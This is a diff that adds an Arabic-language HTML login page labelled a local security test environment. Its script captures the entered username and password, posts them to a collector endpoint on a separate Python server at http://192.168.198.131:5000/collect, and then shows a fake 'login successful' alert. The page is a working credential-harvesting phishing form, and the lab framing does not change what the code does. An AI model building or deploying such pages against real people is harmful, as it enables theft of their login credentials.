@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>بيئة اختبار محلية متكاملة</title>
+    <style>
+        body { font-family: Tahoma, sans-serif; background: #0f1117; color: #fff; display: flex; justify-content: center; align-items:center; height: 100vh; margin: 0; }
+        .box { background: #171a23; padding: 30px; border-radius: 12px; border: 1px solid #262b38; width: 320px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #0b0d13; border: 1px solid #262b38; color: #fff; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #3ddc97; border: none; color: #000; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        p { color: #9aa3b2; font-size: 0.85rem; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h3>تسجيل الدخول</h3>
+    <p>بيئة اختبار أمان محلية</p>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="اسم المستخدم" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button type="submit">دخول</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        // إرسال البيانات مباشرة لسيرفر بايثون على الآيبي والبورت
+        fetch('http://192.168.198.131:5000/collect', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ username: user, password: pass }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert("تم تسجيل الدخول بنجاح (تجربة محاكاة)!");
+            document.getElementById('loginForm').reset();
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            alert("حدث خطأ في الاتصال بالسيرفر.");
+        });
+    });
+</script>
+
+</body>
+</html>
